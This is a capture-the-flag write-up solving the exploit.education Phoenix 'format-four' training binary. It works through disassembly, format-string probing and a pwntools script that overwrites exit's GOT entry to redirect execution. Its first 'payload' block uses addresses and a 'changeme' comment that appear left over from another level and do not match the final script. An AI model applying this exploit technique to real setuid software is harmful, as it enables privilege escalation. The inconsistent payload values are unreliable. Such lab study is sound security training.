# &#35; format-4

#### &#42; pseudocode using ghidra
```bash

undefined4 main(void)

{
  ssize_t sVar1;
  undefined local_1010 [4100];
  undefined *local_c;
  
  local_c = &stack0x00000004;
  puts("Welcome to phoenix/format-four, brought to you by https://exploit.education");
  sVar1 = read(0,local_1010,4095);
  if (sVar1 < 1) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  bounce(local_1010);
  return 0;
}

void bounce(char *param_1)

{
  printf(param_1);
                    /* WARNING: Subroutine does not return */
  exit(0);
}


void congratulations(void)

{
  puts("Well done, you\'re redirected code execution!");
                    /* WARNING: Subroutine does not return */
  exit(0);
}


```

#### &#42; check binary
```bash
$ file /opt/phoenix/i486/format-four
/opt/phoenix/i486/format-four: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
  dynamically linked, interpreter /opt/phoenix/i486-linux-musl/lib/ld-musl-i386.so.1, not stripped

$ checksec /opt/phoenix/i486/format-four
[*] '/opt/phoenix/i486/format-four'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
    RPATH:    '/opt/phoenix/i486-linux-musl/lib'

```


#### &#42; how it work
```bash
$ /opt/phoenix/i486/format-four
Welcome to phoenix/format-four, brought to you by https://exploit.education
AAAA
AAAA


$ /opt/phoenix/i486/format-four
Welcome to phoenix/format-four, brought to you by https://exploit.education
AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
AAAA.0.0.0.f7f81cf7.f7ffb000.ffffd668.804857d.ffffc660.ffffc660.fff.0.41414141.2e78252e.252e7825.78252e78.2e78252e

```

#### &#42; vulnerable point
```bash
#### we need to overwrite exit.got to congurations
$ gdb /opt/phoenix/i486/format-four -q
GEF for linux ready, type `gef' to start, `gef config' to configure
71 commands loaded for GDB 8.2.1 using Python engine 3.5
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from /opt/phoenix/i486/format-four...(no debugging symbols found)...done.
gef> disas main
Dump of assembler code for function main:
   0x08048523 <+0>:	lea    ecx,[esp+0x4]
   0x08048527 <+4>:	and    esp,0xfffffff0
   0x0804852a <+7>:	push   DWORD PTR [ecx-0x4]
   0x0804852d <+10>:	push   ebp
   0x0804852e <+11>:	mov    ebp,esp
   0x08048530 <+13>:	push   ecx
   0x08048531 <+14>:	sub    esp,0x1004
   0x08048537 <+20>:	sub    esp,0xc
   0x0804853a <+23>:	push   0x8048600
   0x0804853f <+28>:	call   0x8048310 <puts@plt>
   0x08048544 <+33>:	add    esp,0x10
   0x08048547 <+36>:	sub    esp,0x4
   0x0804854a <+39>:	push   0xfff
   0x0804854f <+44>:	lea    eax,[ebp-0x1008]
   0x08048555 <+50>:	push   eax
   0x08048556 <+51>:	push   0x0
   0x08048558 <+53>:	call   0x8048320 <read@plt>
   0x0804855d <+58>:	add    esp,0x10
   0x08048560 <+61>:	test   eax,eax
   0x08048562 <+63>:	jg     0x804856e <main+75>
   0x08048564 <+65>:	sub    esp,0xc
   0x08048567 <+68>:	push   0x1
   0x08048569 <+70>:	call   0x8048330 <exit@plt>
   0x0804856e <+75>:	sub    esp,0xc
   0x08048571 <+78>:	lea    eax,[ebp-0x1008]
   0x08048577 <+84>:	push   eax
   0x08048578 <+85>:	call   0x80484e5 <bounce>
   0x0804857d <+90>:	add    esp,0x10
   0x08048580 <+93>:	mov    eax,0x0
   0x08048585 <+98>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048588 <+101>:	leave
   0x08048589 <+102>:	lea    esp,[ecx-0x4]
   0x0804858c <+105>:	ret
End of assembler dump.
gef>
  
gef> disas bounce
Dump of assembler code for function bounce:
   0x080484e5 <+0>:	push   ebp
   0x080484e6 <+1>:	mov    ebp,esp
   0x080484e8 <+3>:	sub    esp,0x8
   0x080484eb <+6>:	sub    esp,0xc
   0x080484ee <+9>:	push   DWORD PTR [ebp+0x8]
   0x080484f1 <+12>:	call   0x8048300 <printf@plt>
   0x080484f6 <+17>:	add    esp,0x10
   0x080484f9 <+20>:	sub    esp,0xc
   0x080484fc <+23>:	push   0x0
   0x080484fe <+25>:	call   0x8048330 <exit@plt>
End of assembler dump.
  
gef> x/i 0x8048330
   0x8048330 <exit@plt>:	jmp    DWORD PTR ds:0x80497e4
gef> x/i 0x80497e4
   0x80497e4 <exit@got.plt>:	add    DWORD PTR ss:[eax+ecx*1],0x46
gef>

gef> disas congratulations
Dump of assembler code for function congratulations:
   0x08048503 <+0>:	push   ebp
   0x08048504 <+1>:	mov    ebp,esp
   0x08048506 <+3>:	sub    esp,0x8
   0x08048509 <+6>:	sub    esp,0xc
   0x0804850c <+9>:	push   0x80485d0
   0x08048511 <+14>:	call   0x8048310 <puts@plt>
   0x08048516 <+19>:	add    esp,0x10
   0x08048519 <+22>:	sub    esp,0xc
   0x0804851c <+25>:	push   0x0
   0x0804851e <+27>:	call   0x8048330 <exit@plt>
End of assembler dump.
gef>

```

#### &#42; payload
```bash

## exit.got = 0x80497e4
## congurations = 0x08048503

# changeme == 0x64457845
payload  = b""
payload += p32(0x08049844)
payload += p32(0x08049845)
payload += p32(0x08049846)
payload += p32(0x08049847)
payload += b".%x"*11
payload += b"A"*244    # 0x145
payload += b"%hhn"
payload += b"B"*51      # 0x178
payload += b"%hhn"
payload += b"B"*205      # 0x245
payload += b"%hhn"
payload += b"B"*31      # 0x264
payload += b"%hhn"

```

#### &#42; exploit
```bash
$ cat exp_format4.py
from pwn import *

context.arch='i386'
#context.log_level='debug'

filename="/opt/phoenix/i486/format-four"

exit_got = 0x80497e4
congurations = 0x08048503

payload  = b""
payload += p32(exit_got+0)
payload += p32(exit_got+1)
payload += p32(exit_got+2)
payload += p32(exit_got+3)
payload += b".%x"*11
payload += b"A"*210     # 0x103
payload += b"%n"
payload += b"B"*386     # 0x285
payload += b"%n"
payload += b"B"*127    # 0x304
payload += b"%n"
payload += b"B"*260      # 0x408
payload += b"%n"
'''
payload  = b""
payload += p32(exit_got+0)
payload += p32(exit_got+1)
payload += b".%x"*11
payload += b"%218x"     # 0x103
payload += b"%hhn"
payload += b"%386x"     # 0x285
payload += b"%hhn"
'''

conn = process(filename)
conn.sendline(payload)

with open("payload", "wb") as fd:
    fd.write(payload)


conn.interactive()




================================= update ==================

```


